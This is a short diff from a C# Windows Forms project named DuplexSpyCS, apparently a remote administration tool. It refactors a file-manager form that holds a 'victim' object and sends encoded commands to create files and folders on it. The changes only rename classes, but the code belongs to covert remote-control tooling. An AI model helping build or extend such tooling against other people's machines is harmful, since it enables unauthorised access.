@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmFileMgrNew : Form
     {
-        public Victim v;
+        public clsVictim v;
         public bool folder = false;
         public string dir;
 
@@ -37,7 +37,7 @@ namespace DuplexSpyCS
         //GENERATE NEW FILE NAME
         private void button2_Click(object sender, EventArgs e)
         {
-            textBox1.Text = radioButton1.Checked ? C1.GenerateFileName() : C1.GenerateFileName("txt");
+            textBox1.Text = radioButton1.Checked ? clsTools.GenerateFileName() : clsTools.GenerateFileName("txt");
         }
 
         //NEW
@@ -48,7 +48,7 @@ namespace DuplexSpyCS
 
             if (radioButton1.Checked) //FOLDER
             {
-                v.encSend(2, 0, "file|new|folder|" + Crypto.b64E2Str(Path.Combine(dir, name)));
+                v.encSend(2, 0, "file|new|folder|" + clsCrypto.b64E2Str(Path.Combine(dir, name)));
             }
             else //FILE
             {
